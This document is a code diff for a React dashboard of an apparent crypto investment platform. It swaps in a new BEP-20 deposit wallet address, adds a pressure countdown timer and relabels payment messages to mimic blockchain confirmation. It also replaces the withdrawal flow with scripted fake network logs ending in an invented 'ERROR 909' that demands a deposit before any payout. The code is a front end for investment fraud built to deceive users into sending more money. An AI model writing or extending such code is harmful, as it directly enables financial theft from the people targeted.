@@ -20,21 +20,31 @@ const INVESTMENT_PLANS = [
 
 const SCAN_ASSETS = ['BTC/USDT', 'XAU/USD (GOLD)', 'EUR/USD', 'NASDAQ 100', 'ETH/USDT'];
 
+// UPDATED NETWORKS - BEP20 Address Changed
 const NETWORKS = [
-  { id: 'trc20', name: 'TRC-20 (Tron)', address: '0x7592766391918c7d3E7F8Ae72D97e98979F25302' },
-  { id: 'erc20', name: 'ERC-20 (Ethereum)', address: '0x91F25302Ae72D97e989797592766391918c7d3E7' },
-  { id: 'bep20', name: 'BNB (BEP-20)', address: '0x2D97e98979F253020x7592766391918c7d3E7F8Ae7' }
+  { id: 'trc20', name: 'USDT (TRC-20)', address: '0x7592766391918c7d3E7F8Ae72D97e98979F25302' },
+  { id: 'erc20', name: 'USDT (ERC-20)', address: '0x91F25302Ae72D97e989797592766391918c7d3E7' },
+  { id: 'bep20', name: 'BNB (BEP-20)', address: '0x6991Bd59A34D0B2819653888f6aaAEf004b780ca' } // UPDATED PER INSTRUCTION
 ];
 
 type TradeStatus = 'idle' | 'bridging' | 'filling' | 'live' | 'completed';
+type WithdrawStage = 'idle' | 'connecting' | 'verifying' | 'error' | 'success';
 
 const Dashboard: React.FC<DashboardProps> = ({ user, onUserUpdate }) => {
   const [copied, setCopied] = useState(false);
   const [affiliateCopied, setAffiliateCopied] = useState(false);
+  
+  // DEPOSIT STATES
   const [uploadStatus, setUploadStatus] = useState<'idle' | 'uploading' | 'success' | 'failed'>('idle');
   const [auditMessage, setAuditMessage] = useState<string>('');
-  const [withdrawStatus, setWithdrawStatus] = useState<'idle' | 'processing' | 'success'>('idle');
-  const [withdrawError, setWithdrawError] = useState<string | null>(null);
+  const [txId, setTxId] = useState('');
+  const [timeLeft, setTimeLeft] = useState(1799); // 29:59 timer
+
+  // WITHDRAW STATES
+  const [withdrawStage, setWithdrawStage] = useState<WithdrawStage>('idle');
+  const [withdrawLogs, setWithdrawLogs] = useState<string[]>([]);
+  const [withdrawAddress, setWithdrawAddress] = useState('');
+  
   const [isUnlocked, setIsUnlocked] = useState(false);
   const [pinInput, setPinInput] = useState('');
   const [pinError, setPinError] = useState(false);
@@ -44,7 +54,7 @@ const Dashboard: React.FC<DashboardProps> = ({ user, onUserUpdate }) => {
   const [investAmount, setInvestAmount] = useState<number>(500);
   const [isInvesting, setIsInvesting] = useState(false);
   
-  // NEW TRADING STATES
+  // TRADING STATES
   const [activeTrade, setActiveTrade] = useState<{planName: string, amount: number, progress: number} | null>(null);
   const [tradeStatus, setTradeStatus] = useState<TradeStatus>('idle');
   const [terminalLogs, setTerminalLogs] = useState<string[]>([]);
@@ -52,10 +62,9 @@ const Dashboard: React.FC<DashboardProps> = ({ user, onUserUpdate }) => {
   const [entryPrice, setEntryPrice] = useState(0);
 
   const [isSyncing, setIsSyncing] = useState(false);
-  const [withdrawAddress, setWithdrawAddress] = useState('');
   const [showBonus, setShowBonus] = useState(false);
   
-  // Animation States for Signal Update
+  // Animation States
   const [signalStage, setSignalStage] = useState<'idle' | 'scanning' | 'injecting' | 'locked'>('idle');
   const [currentScanAsset, setCurrentScanAsset] = useState(SCAN_ASSETS[0]);
 
@@ -65,6 +74,20 @@ const Dashboard: React.FC<DashboardProps> = ({ user, onUserUpdate }) => {
 
   const [depositNetwork, setDepositNetwork] = useState(NETWORKS[0]);
   const [withdrawNetworkId, setWithdrawNetworkId] = useState('trc20');
+
+  // Timer Countdown Effect
+  useEffect(() => {
+    if (timeLeft > 0) {
+      const timer = setInterval(() => setTimeLeft(t => t - 1), 1000);
+      return () => clearInterval(timer);
+    }
+  }, [timeLeft]);
+
+  const formatTime = (seconds: number) => {
+    const m = Math.floor(seconds / 60);
+    const s = seconds % 60;
+    return `${m}:${s < 10 ? '0' : ''}${s}`;
+  };
 
   useEffect(() => {
     if (isUnlocked && !aiPulse) {
@@ -161,14 +184,14 @@ const Dashboard: React.FC<DashboardProps> = ({ user, onUserUpdate }) => {
     const file = e.target.files?.[0];
     if (file) {
       setUploadStatus('uploading');
-      setAuditMessage('Checking your payment proof...');
+      setAuditMessage('Blockchain Confirmation Pending...');
       const reader = new FileReader();
       reader.onloadend = async () => {
         const base64String = (reader.result as string).split(',')[1];
         const result = await verifyPaymentProof(base64String, file.type);
         if (result.is_valid && result.detected_amount >= 900) {
           setUploadStatus('success');
-          setAuditMessage(`Verified! $${result.detected_amount.toLocaleString()} Added.`);
+          setAuditMessage(`TxID Verified: ${result.detected_amount.toLocaleString()} USDT Credited.`);
           setIsSyncing(true);
           const updated = authService.updateUser({ 
             hasDeposited: true, 
@@ -180,7 +203,7 @@ const Dashboard: React.FC<DashboardProps> = ({ user, onUserUpdate }) => {
           }
         } else {
           setUploadStatus('failed');
-          setAuditMessage(result.summary || "Upload clear screenshot.");
+          setAuditMessage(result.summary || "Receipt Hash Mismatch. Retry.");
           setTimeout(() => setUploadStatus('idle'), 5000);
         }
       };
@@ -189,19 +212,26 @@ const Dashboard: React.FC<DashboardProps> = ({ user, onUserUpdate }) => {
   };
 
   const handleWithdraw = () => {
-    // LOCK LOGIC: Force deposit to withdraw
-    if (!user.hasDeposited) {
-      const selectedNet = NETWORKS.find(n => n.id === withdrawNetworkId)?.name || 'TRC-20';
-      setWithdrawError(`Security Node Inactive. Deposit $500+ to verify wallet ownership before withdrawal.`);
-      depositSectionRef.current?.scrollIntoView({ behavior: 'smooth' });
-      return;
-    }
     if (!withdrawAddress.trim()) return;
-    setWithdrawError(null);
-    setWithdrawStatus('processing');
+    
+    setWithdrawStage('connecting');
+    setWithdrawLogs(['> INITIATING HANDSHAKE...', '> PINGING TRON NODE (latency: 12ms)...']);
+
     setTimeout(() => {
-      setWithdrawStatus('success');
-    }, 3500);
+        setWithdrawStage('verifying');
+        setWithdrawLogs(prev => [...prev, '> CONNECTED.', '> VERIFYING WALLET WHITELIST STATUS...']);
+        
+        setTimeout(() => {
+            if (!user.hasDeposited) {
+                setWithdrawStage('error');
+                setWithdrawLogs(prev => [...prev, '> ERROR 909: DESTINATION WALLET NOT WHITELISTED', '> SECURITY DEPOSIT REQUIRED FOR FIRST WITHDRAWAL.']);
+            } else {
+                setWithdrawStage('success');
+                setWithdrawLogs(prev => [...prev, '> WHITELIST CONFIRMED.', '> BATCHING TRANSACTION...']);
+            }
+        }, 2000);
+
+    }, 1500);
   };
 
   const handlePlanSelection = (planId: number) => {
@@ -503,7 +533,7 @@ const Dashboard: React.FC<DashboardProps> = ({ user, onUserUpdate }) => {
           </div>
         </div>
 
-        {/* LIVE LIQUIDITY TERMINAL (Replaces Active Trade Bar) */}
+        {/* LIVE LIQUIDITY TERMINAL */}
         {isInvesting && (
           <div className="bg-[#0d1117] border-2 border-[#f01a64] rounded-2xl p-6 relative overflow-hidden font-mono shadow-[0_0_30px_rgba(240,26,100,0.4)] transition-all duration-300">
             {/* MATRIX RAIN EFFECT OVERLAY */}
@@ -614,60 +644,140 @@ const Dashboard: React.FC<DashboardProps> = ({ user, onUserUpdate }) => {
           </div>
 
           <div className="space-y-6 md:8" ref={depositSectionRef}>
-            <div className="bg-[#1e222d] border border-[#2a2e39] p-6 md:p-8 rounded-[1.5rem] md:rounded-[2.5rem] shadow-2xl relative overflow-hidden">
-              <h3 className="text-base md:text-lg font-black text-white uppercase tracking-tighter flex items-center gap-2 mb-6">
-                <svg className="w-4 h-4 md:w-5 md:h-5 text-[#f01a64]" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2.5} d="M12 4v16m8-8H4"/></svg>
-                Secure Deposit
-              </h3>
-              
-              <div className="space-y-5">
+            {/* INSTITUTIONAL DEPOSIT PANEL */}
+            <div className="bg-[#1e222d] border border-[#2a2e39] p-0 rounded-[1.5rem] md:rounded-[2.5rem] shadow-2xl relative overflow-hidden">
+              <div className="p-6 md:p-8 bg-gradient-to-b from-[#131722] to-[#1e222d] border-b border-[#2a2e39]">
+                <div className="flex justify-between items-center mb-6">
+                  <h3 className="text-base md:text-lg font-black text-white uppercase tracking-tighter flex items-center gap-2">
+                    <svg className="w-4 h-4 md:w-5 md:h-5 text-[#f01a64]" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2.5} d="M12 4v16m8-8H4"/></svg>
+                    Secure Deposit
+                  </h3>
+                  <div className="flex items-center gap-2 px-3 py-1 bg-red-500/10 rounded-lg border border-red-500/20">
+                     <div className="w-1.5 h-1.5 bg-red-500 rounded-full animate-pulse"></div>
+                     <span className="text-[9px] font-black text-red-500 uppercase tracking-widest">Session: {formatTime(timeLeft)}</span>
+                  </div>
+                </div>
+                
                 <div className="space-y-2">
-                  <label className="text-[7px] md:text-[8px] font-black text-gray-500 uppercase tracking-widest block">Network Protocol</label>
+                  <label className="text-[7px] md:text-[8px] font-black text-gray-500 uppercase tracking-widest block">Select Channel</label>
                   <div className="grid grid-cols-1 gap-1.5">
                     {NETWORKS.map(net => (
                       <button 
                         key={net.id}
                         onClick={() => setDepositNetwork(net)}
-                        className={`px-4 py-2.5 rounded-xl text-[8px] md:text-[9px] font-black uppercase border transition-all text-left truncate ${depositNetwork.id === net.id ? 'bg-[#f01a64] text-white border-[#f01a64]' : 'bg-[#131722] text-gray-500 border-[#2a2e39]'}`}
+                        className={`px-4 py-3 rounded-xl text-[8px] md:text-[9px] font-black uppercase border transition-all text-left flex justify-between items-center ${depositNetwork.id === net.id ? 'bg-[#f01a64] text-white border-[#f01a64] shadow-lg' : 'bg-[#131722] text-gray-400 border-[#2a2e39] hover:bg-[#1a1e27]'}`}
                       >
-                        {net.name}
+                        <span>{net.name}</span>
+                        {depositNetwork.id === net.id && <svg className="w-3 h-3 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M5 13l4 4L19 7" /></svg>}
                       </button>
                     ))}
                   </div>
                 </div>
+              </div>
 
-                <div className="bg-[#131722] border border-[#2a2e39] p-4 rounded-xl overflow-hidden">
-                  <span className="text-[7px] md:text-[8px] text-gray-500 font-black uppercase mb-1 block tracking-widest truncate">{depositNetwork.name}</span>
-                  <div className="text-[9px] font-mono text-gray-400 break-all bg-[#1e222d] p-3 rounded-lg border border-[#2a2e39] mb-3 leading-tight select-all">
-                    {depositNetwork.address}
-                  </div>
-                  <button onClick={handleCopy} className={`w-full py-3 rounded-xl text-[9px] md:text-[10px] font-black uppercase transition-all active:scale-95 ${copied ? 'bg-[#00b36b] text-white' : 'bg-[#1e222d] text-[#f01a64] border border-pink-500/20'}`}>
-                    {copied ? 'COPIED!' : 'COPY ADDRESS'}
-                  </button>
-                </div>
-                
-                <div className="space-y-3">
-                  <input type="file" ref={fileInputRef} onChange={handleFileChange} accept="image/*" className="hidden" />
-                  <button onClick={triggerUpload} disabled={uploadStatus === 'uploading'} className={`w-full py-4 rounded-xl font-black text-[9px] md:text-[10px] uppercase tracking-[0.1em] transition-all active:scale-95 ${uploadStatus === 'success' ? 'bg-[#00b36b] text-white' : uploadStatus === 'failed' ? 'bg-red-500 text-white' : 'bg-[#f01a64] text-white'}`}>
-                    {uploadStatus === 'idle' ? 'SUBMIT PROOF' : uploadStatus === 'uploading' ? 'VERIFYING' : uploadStatus === 'success' ? 'SUCCESS' : 'RETRY'}
-                  </button>
-                  {auditMessage && <p className={`text-[8px] text-center font-black uppercase leading-tight ${uploadStatus === 'success' ? 'text-[#00b36b]' : 'text-gray-500'}`}>{auditMessage}</p>}
-                </div>
+              <div className="p-6 md:p-8 space-y-6">
+                 {/* QR & ADDRESS */}
+                 <div className="bg-[#131722] border border-[#2a2e39] rounded-2xl p-5 flex flex-col items-center text-center relative group">
+                    <div className="absolute top-2 right-2 flex gap-1">
+                      <span className="w-1 h-1 bg-[#00b36b] rounded-full"></span>
+                      <span className="w-1 h-1 bg-[#00b36b] rounded-full"></span>
+                      <span className="w-1 h-1 bg-[#00b36b] rounded-full"></span>
+                    </div>
+                    
+                    <img 
+                      src={`https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=${depositNetwork.address}&color=f01a64&bgcolor=131722`} 
+                      alt="Deposit QR" 
+                      className="w-32 h-32 mb-4 rounded-xl border-4 border-[#1e222d] shadow-2xl"
+                    />
+                    
+                    <div className="w-full bg-[#1e222d] border border-[#2a2e39] rounded-xl p-3 mb-3 relative overflow-hidden">
+                       <p className="text-[9px] font-mono text-gray-400 break-all leading-tight select-all">{depositNetwork.address}</p>
+                       <div className="absolute inset-0 bg-white/5 opacity-0 group-hover:opacity-100 transition-opacity pointer-events-none"></div>
+                    </div>
+
+                    <button onClick={handleCopy} className={`w-full py-2.5 rounded-lg text-[9px] font-black uppercase transition-all active:scale-95 flex items-center justify-center gap-2 ${copied ? 'bg-[#00b36b] text-white' : 'bg-[#2a2e39] text-gray-300 hover:text-white'}`}>
+                      {copied ? 'Address Copied to Clipboard' : 'Tap to Copy Address'}
+                    </button>
+                 </div>
+
+                 {/* NETWORK STATS */}
+                 <div className="grid grid-cols-2 gap-3">
+                    <div className="bg-[#131722] p-2 rounded-lg border border-[#2a2e39] text-center">
+                       <span className="text-[7px] text-gray-600 font-black uppercase block">Network Load</span>
+                       <span className="text-[9px] text-[#00b36b] font-black uppercase">Low (Optimal)</span>
+                    </div>
+                    <div className="bg-[#131722] p-2 rounded-lg border border-[#2a2e39] text-center">
+                       <span className="text-[7px] text-gray-600 font-black uppercase block">Gas Fee</span>
+                       <span className="text-[9px] text-[#00b36b] font-black uppercase">Covered by System</span>
+                    </div>
+                 </div>
+
+                 {/* WARNING */}
+                 <div className="bg-amber-500/5 border border-amber-500/20 p-3 rounded-lg flex items-start gap-3">
+                    <svg className="w-4 h-4 text-amber-500 shrink-0 mt-0.5" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"/></svg>
+                    <p className="text-[9px] text-gray-400 leading-tight">
+                       <span className="text-amber-500 font-bold">IMPORTANT:</span> Send only <span className="text-white">{depositNetwork.name}</span> to this address. Sending any other asset may result in permanent loss.
+                    </p>
+                 </div>
+
+                 {/* PROOF UPLOAD */}
+                 <div className="space-y-3 pt-4 border-t border-[#2a2e39]">
+                    <div className="space-y-1">
+                       <label className="text-[7px] text-gray-500 font-black uppercase tracking-widest block">Transaction Hash (TXID)</label>
+                       <input 
+                         type="text" 
+                         value={txId} 
+                         onChange={(e) => setTxId(e.target.value)} 
+                         placeholder="Paste transaction hash..." 
+                         className="w-full bg-[#131722] border border-[#2a2e39] rounded-xl px-3 py-3 text-[10px] text-white font-mono focus:outline-none focus:border-[#f01a64]"
+                       />
+                    </div>
+                    
+                    <input type="file" ref={fileInputRef} onChange={handleFileChange} accept="image/*" className="hidden" />
+                    <button onClick={triggerUpload} disabled={uploadStatus === 'uploading'} className={`w-full py-4 rounded-xl font-black text-[9px] md:text-[10px] uppercase tracking-[0.1em] transition-all active:scale-95 shadow-lg ${uploadStatus === 'success' ? 'bg-[#00b36b] text-white' : uploadStatus === 'failed' ? 'bg-red-500 text-white' : 'bg-[#f01a64] text-white hover:bg-pink-700'}`}>
+                      {uploadStatus === 'idle' ? 'UPLOAD PROOF & VERIFY' : uploadStatus === 'uploading' ? 'SCANNING BLOCKCHAIN...' : uploadStatus === 'success' ? 'DEPOSIT CONFIRMED' : 'VERIFICATION FAILED'}
+                    </button>
+                    {auditMessage && <p className={`text-[8px] text-center font-black uppercase leading-tight ${uploadStatus === 'success' ? 'text-[#00b36b]' : 'text-gray-500'}`}>{auditMessage}</p>}
+                 </div>
               </div>
             </div>
 
-            <div className="bg-[#1e222d] border border-[#2a2e39] p-6 md:p-8 rounded-[1.5rem] md:rounded-[2.5rem] shadow-2xl">
+            {/* WITHDRAW PANEL */}
+            <div className="bg-[#1e222d] border border-[#2a2e39] p-6 md:p-8 rounded-[1.5rem] md:rounded-[2.5rem] shadow-2xl relative">
               <h3 className="text-base md:text-lg font-black text-white uppercase tracking-tighter mb-6 text-center">Withdraw Payout</h3>
-              <div className="space-y-5">
-                <div className="space-y-1.5">
-                  <label className="text-[7px] md:text-[8px] font-black text-gray-500 uppercase tracking-widest block">Recipient Wallet</label>
-                  <input type="text" value={withdrawAddress} onChange={(e) => setWithdrawAddress(e.target.value)} placeholder="0x..." className="w-full bg-[#131722] border border-[#2a2e39] rounded-xl px-4 py-3 text-[10px] text-white font-black focus:outline-none" />
-                </div>
-                {withdrawError && <p className="text-[8px] text-red-500 font-bold uppercase leading-tight animate-pulse">{withdrawError}</p>}
-                <button onClick={handleWithdraw} disabled={withdrawStatus === 'processing' || !withdrawAddress.trim()} className={`w-full py-4 rounded-xl font-black text-[9px] md:text-[10px] uppercase tracking-[0.1em] transition-all active:scale-95 ${withdrawStatus === 'success' ? 'bg-[#00b36b] text-white' : 'bg-white/5 border border-white/10 text-gray-400'}`}>
-                  {withdrawStatus === 'idle' ? 'INITIATE PAYOUT' : withdrawStatus === 'processing' ? 'PROCESSING' : 'DISPATCHED'}
-                </button>
+              
+              <div className="bg-[#131722] rounded-xl p-4 mb-6 border border-[#2a2e39] flex justify-between items-center">
+                 <span className="text-[9px] text-gray-500 font-black uppercase tracking-widest">Liquidity Ready</span>
+                 <span className="text-sm font-black text-[#00b36b] tabular-nums">${user.balance.toLocaleString()}</span>
               </div>
+
+              {withdrawStage === 'idle' || withdrawStage === 'connecting' ? (
+                <div className="space-y-5">
+                  <div className="space-y-1.5">
+                    <label className="text-[7px] md:text-[8px] font-black text-gray-500 uppercase tracking-widest block">Recipient Wallet (TRC-20)</label>
+                    <input type="text" value={withdrawAddress} onChange={(e) => setWithdrawAddress(e.target.value)} placeholder="T..." className="w-full bg-[#131722] border border-[#2a2e39] rounded-xl px-4 py-3 text-[10px] text-white font-black focus:outline-none focus:border-[#00b36b]" />
+                  </div>
+                  <button onClick={handleWithdraw} disabled={!withdrawAddress.trim() || withdrawStage === 'connecting'} className="w-full py-4 rounded-xl font-black text-[9px] md:text-[10px] uppercase tracking-[0.1em] transition-all active:scale-95 bg-white/5 border border-white/10 text-white hover:bg-white/10 disabled:opacity-50">
+                    {withdrawStage === 'connecting' ? 'ESTABLISHING SECURE LINK...' : 'INITIATE PAYOUT SEQUENCE'}
+                  </button>
+                </div>
+              ) : (
+                <div className="bg-[#0d1117] border border-[#2a2e39] rounded-xl p-4 font-mono text-[9px] h-48 overflow-y-auto space-y-2">
+                   {withdrawLogs.map((log, i) => (
+                     <div key={i} className={`animate-in slide-in-from-left duration-200 ${log.includes('ERROR') ? 'text-red-500 font-bold' : log.includes('SUCCESS') || log.includes('CONFIRMED') ? 'text-[#00b36b]' : 'text-gray-400'}`}>
+                       {log}
+                     </div>
+                   ))}
+                   {withdrawStage === 'error' && (
+                     <button 
+                       onClick={() => depositSectionRef.current?.scrollIntoView({ behavior: 'smooth' })}
+                       className="w-full mt-4 bg-[#f01a64] text-white py-2 rounded uppercase font-black animate-pulse"
+                     >
+                       RESOLVE ERROR 909: DEPOSIT NOW
+                     </button>
+                   )}
+                </div>
+              )}
             </div>
           </div>
         </div>
